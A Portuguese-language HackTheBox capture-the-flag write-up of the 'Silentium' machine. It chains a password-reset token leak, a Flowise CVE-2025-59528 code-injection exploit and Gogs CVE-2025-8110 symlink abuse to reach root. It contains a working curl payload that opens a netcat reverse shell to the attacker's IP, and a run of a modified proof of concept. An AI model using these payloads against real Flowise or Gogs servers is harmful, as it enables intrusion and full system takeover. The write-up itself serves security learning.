---
title: Silentium HTB Write-up
created: 2026-04-13 17:49
tags:
  - ctf
  - hackthebox
  - walkthrough
  - CVE-2025-59528
  - CVE-2025-8110
  - CVE-2025-58434
draft: false
---

# A Queda Silenciosa: Como uma cadeia de exploits críticos derrubou uma instituição financeira.

![A imagem mostra um homem de capuz e óculos fazendo um gesto de pedir silêncio](images/silentium/Silentium.png)

## Introdução

Olá Mundo!! Seja bem vindo a mais uma aventura [Hackthebox](https://www.hackthebox.com)

`Silentium` é uma máquina classificada como de dificuldade fácil, onde exploramos um site de instituição financeira. Após descobrir uma página de login em um subdomínio, conseguimos fazer um `bypass via password reset`, alcançando o painel administrativo do `FlowiseAI 3.0.5`. A versão do `Flowise` é vulnerável à `CVE-2025-59528 FlowiseAI Custom MCP Remote code Execution`, que após ser explorada, resulta em obter o `root` de um Container Docker. Credenciais hardcoded no arquivo `env` do container nos permitem reutilizar uma senha no [[SSH]], permitindo acessar o servidor principal como usuário `ben`. Para o `root` exploramos a `CVE-2025-8110 Gogs RCE Vulnerability via Symlink Handling`, que nos permite usar links simbólicos para escapar do contexto do repositório e executar comandos arbitrários no servidor.

Essa vai ser uma aventura e tanto, então vamos lá.

---
## Reconhecimento

### Nmap

O scan do [[NMAP]] retornou apenas duas portas abertas, **22** e **80**.

```bash {10}
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Havia um redirecionamento para `silentium.htb`, por isso adicionei o domínio ao arquivo `/etc/hosts`.
### Web

![[silentium-0.png | A imagem mostra a home page do site silentium.htb]]

Na porta **80** havia uma página de uma instituição financeira chamada `silentium`. Não havia botões ou campo de busca para interagir, era apenas uma página estática. No entanto haviam três nomes na página que poderiam ser usuários válidos a serem comprometidos. 

![[silentium-3.png | Na imagem vemos três nomes de chefes da silentium.htb: Marcus Thorne, Ben e Elena Rossi]]

### Página de login

Usando a ferramenta `Ffuf`, verifiquei se haviam subdomínios que pudessem trazer outros vetores de ataque.

```bash {25}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ ffuf -w $subdomwordlist -u http://$domain -H "Host: FUZZ.$domain" -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 278ms]
:: Progress: [4989/4989] :: Job [1/1] :: 168 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```

O subdomínio encontrado `staging.silentium.htb` não podia ser acessado diretamente. Depois de adicionar ao meu arquivo `/etc/hosts` pude acessá-lo e encontrei uma página de login.

![[silentium-1.png | A imagem mostra a pagina de login no subdomínio staging.silentium.htb]]

Eu não tinha nem usuário e nem senha válida até esse momento. Então liguei minha extensão do navegador, `OWASP Penetration Testing Kit`, e testei algumas credenciais de teste só para poder enviar ao `R-Buider`, que é como um `Burp Repeater`.

Ao clicar em `forgot-password` usando `ben@silentium.htb` como usuário, tive uma resposta inesperada.

![[silentium-2.png | A imagem mostra o R-Builder, do owasp pentest toolkit, fazendo uma requisiçao para o endpoint forgot-password]]

Requisicao feita:

```bash
POST http://staging.silentium.htb/api/v1/account/forgot-password HTTP/1.1
X-Request-From: internal
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: http://staging.silentium.htb
Referer: http://staging.silentium.htb/forgot-password
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Host: staging.silentium.htb
Content-Length: 38

{"user":{"email":"ben@silentium.htb"}}
```

Resposta do servidor:

```json
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"MMtUgcVHxPKBn0p8hkEhdLXiTEzxf8sxwYoeq2Dd2WA5201ZpqK9wX0p4PFNoqEU","tokenExpiry":"2026-04-11T20:11:35.174Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-11T19:56:35.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

No corpo da resposta havia uma chave chamada `"credential"` com o valor `"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG"`. Eu rapidamente salvei o valor em um arquivo chamado **hash**.

No entanto, a tentativa de quebrar a hash com `JohnTheRipper` foi sem sucesso.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:07:16 3.28% (ETA: 20:48:53) 0g/s 1246p/s 1246c/s 1246C/s Alisa..AlEjAnDrO
0g 0:00:07:54 3.58% (ETA: 20:47:29) 0g/s 1253p/s 1253c/s 1253C/s reeses88..reeree08
Session aborted
```

Então, fiz outra requisição para `forgot-password` e peguei um token temporario. Usando esse token consegui resetar a senha do ben, no endpoint `reset-password`.

![[silentium-4.png | A imagem mostra a página reset-password. Na imagem vemos os campos preenchidos para criar uma nova senha para o usuário ben]]

Usando a senha nova `Password123@` entrei com a conta do `ben` e acessei seu painel administrativo.

![[silentium-5.png | A imagem mostra o painel administrativo do Flowise]]

---
## Acesso Inicial

### FlowiseAI RCE

Nas configurações do painel eu podia visualizar a versão da aplicação. Se tratava do `Flowise 3.0.5`.


![[silentium-6.png | A imagem mostra a versão do Flowise, 3.0.5]]

>[!question] **O que é o Flowise?**
>**Flowise** é um construtor de LLMs e agentes autônomos do tipo "drag-and-drop", ou arrastar e soltar.  Você consegue fazer tudo de forma visual, sem a necessidade de escrever código complexo. 

A versão `3.0.5` era vulnerável à `CVE-2025-59528 FlowiseAI Custom MCP Remote code Execution`, uma vulnerabilidade crítica, que recebeu a pontuação **10.0** no [[CVSS]].

>[!info] **A CVE-2025-59528**
>Essa vulnerabilidade reside no componente `CustomMCP` do Flowise, que é usado para conectar a servidores externos baseados no **Model Context Protocol** (MCP). O componente `CustomMCP` não valida adequadamente as entradas fornecidas pelo usuário ao configurar o servidor **MCP**. O código JavaScript fornecido pelo usuário é passado diretamente para uma função que o avalia e executa no ambiente Node.js.
>Um invasor com acesso à **API key** pode explorar essa falha por executar códigos arbitrários com privilégios totais no ambiente Node.js.

No painel administrativo, eu tinha acesso à **API Key** do `Flowise` e também podia gerar uma nova.

![[silentium-7.png | A imagem mostra a API Key do Flowise]]

Para explorar a falha, usei uma POC do Github. Com a ferramenta Curl, fiz a requisição para o endpoint `/api/v1/node-load-method/customMCP`:

```bash {4}
$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer 1Q651TbFQaSuWsvXSxZUdQM7IGpSUsO6BnfsDbVsavo' \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 9001 >/tmp/f \");return 1;})()})"}}'
```

![[silentium-8.png | A imagem mostra o payload do Curl e o netcat recebendo a conexão reversa]]

No meu listener eu tinha pegado a shell reversa como `root`. No entanto não se tratava do servidor principal, mas um container `Docker` onde o `Flowise` estava rodando.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.31.160] 33653
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # hostname
c78c3cceb7ba
/ #
```

Assim eu ainda precisava escapar do container.

---
## Escalação de Privilégios

### Shell como Ben

Usando o comando `env` encontrei algumas credenciais hardcoded. 

```bash {27}
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=4
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
TERM=xterm
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
/ #
```

Testando as senhas no [[SSH]]  com o usuário `ben@silentium.htb`, tive sucesso por meio da senha `r04D!!_R4ge`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ ssh ben@silentium.htb
The authenticity of host 'silentium.htb (10.129.31.160)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:59: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
ben@silentium.htb's password:     # r04D!!_R4ge
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 --- REDACTED ---

Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$
```

Aproveitei e peguei a flag de usuario.

```bash
ben@silentium:~$ cat user.txt
fc09d7dc179a02c7337730c27b1acb6a
```

### Shell como Root

Agora só faltava escalar para o `root` do servidor principal. Assim, verifiquei as permissões de `sudo`. 

```bash
ben@silentium:~$ sudo -l
[sudo] password for ben:
Sorry, user ben may not run sudo on silentium.
```

Como não tinha privilegios de `sudo`, verifiquei se haviam portas abertas escutando na rede interna. Descobri que a porta **3001** estava aberta. A porta **3000** rodava o `Flowise`, mas o que estaria rodando na porta **3001**?

```bash {13}
ben@silentium:~$ ss -tulnp
Netid           State            Recv-Q           Send-Q                      Local Address:Port                        Peer Address:Port           Process
udp             UNCONN           0                0                              127.0.0.54:53                               0.0.0.0:*
udp             UNCONN           0                0                           127.0.0.53%lo:53                               0.0.0.0:*
udp             UNCONN           0                0                                 0.0.0.0:68                               0.0.0.0:*
tcp             LISTEN           0                4096                            127.0.0.1:1025                             0.0.0.0:*
tcp             LISTEN           0                4096                            127.0.0.1:42197                            0.0.0.0:*
tcp             LISTEN           0                4096                              0.0.0.0:22                               0.0.0.0:*
tcp             LISTEN           0                511                               0.0.0.0:80                               0.0.0.0:*
tcp             LISTEN           0                4096                            127.0.0.1:8025                             0.0.0.0:*
tcp             LISTEN           0                4096                           127.0.0.54:53                               0.0.0.0:*
tcp             LISTEN           0                4096                            127.0.0.1:3000                             0.0.0.0:*
tcp             LISTEN           0                4096                            127.0.0.1:3001                             0.0.0.0:*
tcp             LISTEN           0                4096                        127.0.0.53%lo:53                               0.0.0.0:*
tcp             LISTEN           0                4096                                 [::]:22                                  [::]:*
tcp             LISTEN           0                511                                  [::]:80                                  [::]:*
```

Usando o comando `ps aux | grep 'root'` listei os serviços rodando como `root`. Um dos resultados era um serviço web.

```bash {5}
ben@silentium:~$ ps aux | grep root

--- REDACTED ---

root        1516  0.0  1.7 1812276 70144 ?       Ssl  Apr11   0:02 /opt/gogs/gogs/gogs web

--- REDACTED ---

ben@silentium:~$
```

>[!note] **Outro subdomínio**
>A pagina web também pode ser confirmada usando o `Curl` do servidor. Além disso no header de resposta encontrei outro subdomínio, `staging-v2-code.dev.silentium.htb`, que mais tarde foi adicionado ao arquivo `/etc/hosts`.

Depois disso fiz o portforwarding pelo `SSH` para acessar o site na rede interna.

```bash
──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
ben@silentium.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
```

Acessando a URL `http://127.0.0.1:3001` via portforward, ou `http://staging-v2-code.dev.silentium.htb` sem o portforward, encontrei a home page do `Gogs`, que é um serviço `Git` auto-hospedado, simples, estável e muito leve. Escrito em `Go`, ele oferece uma interface web similar ao Github, permitindo gerenciar projetos com pouco consumo de recursos.

![[silentium-9.png | A imagem mostra a home page do Gogs]]

Ao clicar em `Sign in` sou direcionado a uma página de login.

![[silentium-10.png | A imagem mostra a página de login do Gogs]]

Então me registrei para acessar o serviço.

![[silentium-11.png | A imagem mostra a página de registro de usuário do Gogs]]

Enquanto isso no servidor, chequei a versão do `Gogs` para poder encontrar possíveis vulnerabilidades.

```bash {4}
ben@silentium:~$ ls -l /opt/gogs/gogs/gogs
-rwxr-xr-x 1 root root 81220896 Jun  9  2025 /opt/gogs/gogs/gogs
ben@silentium:~$ /opt/gogs/gogs/gogs -v
Gogs version 0.13.3
ben@silentium:~$
```

A versão do `Gogs` e vulnerável a `CVE-2025-8110 File overwrite in file update API in Gogs`, uma vulnerabilidade classificada como **Alta** no `CVSS`.

>[!info] **A CVE-2025-8110**
>Essa vulnerabilidade permite que um usuário autenticado ignore as proteções de **path traversal** através de uma manipulação indevida de links simbólicos (symlinks) na API `PutContents`. Isso resulta em uma substituição arbitrária de arquivos no servidor host, permitindo que atacantes executem comandos remotamente e obtenham controle total sobre o sistema.

Para explorar essa falha, usei uma [POC](https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py) do Github. No entanto, a **POC** não funcionou. 

Examinando com cuidado, percebi que o script tentava registrar um novo usuário, mas falhava por causa do `Captcha`.

Daí, removi do código a função de registrar e alterarei as credenciais padrão da **POC**, substituindo pelas que eu ja tinha registrado. Assim, ao verificar o usuário registrado, o código dava prosseguimento para a parte de exploração.

Ao rodar o script modificado eu obtive o `root` do servidor principal.

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Silentium/tools]
└─$ python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb/ -lh 10.10.14.8 -lp 9001
[+] Authenticated successfully
Token generation status: 200
[+] Application token: 0d067dc1cd61bbbfe6904448a88b4ad21f72636a
Repo creation status: 201
Cloning into '/tmp/bdc7e9fe4f6b'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 252 bytes | 31.00 KiB/s, done.
[master bfd156d] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 311 bytes | 311.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://staging-v2-code.dev.silentium.htb/preacher/bdc7e9fe4f6b.git
   f68895f..bfd156d  master -> master
[+] Exploit sent, check your listener!
```

No kali recebi a shell reversa.

```bash {7}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Silentium]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.32.147] 45810
bash: cannot set terminal process group (1523): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2#
```

Por fim peguei a **flag do root**.

```bash {9}
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd /root
cd /root
root@silentium:~# ls
ls
gogs-repositories
root.txt
root@silentium:~# cat root.txt
cat root.txt
9683393059f0f6ee01cb641b48e8541d
```
## Conclusão

![[SilentiumFinal.png | A imagem mostra o banner da máquina. Abaixo está escrito: Silentium has been pwned]]


Nessa máquina aprendi algumas coisas novas, como por exemplo, a exploração de falhas no `Flowise` e no `Gogs`. Outra coisa que vale destacar é que pequenas falhas que parecem que ninguém vai ver, como as **credenciais hardcoded no Container**, podem acabar se tornando a peça chave de uma exploração muito maior.

Segue o fluxo de exploração da máquina:

```mermaid
flowchart TD
	subgraph acesso inicial
    A(ben user) -->|login bypass via reset-password| B(FlowiseAI admin panel) 
    B -->|CVE-2025-59528| C(Container user root)
    end
    subgraph escalação de privilegios
    C -->|credential leak in env file| D(SSH user ben)
    D -->|portforward| E[Gogs internal web service]
    E -->|CVE-2025-8110| F(SSH user root)
    end
```


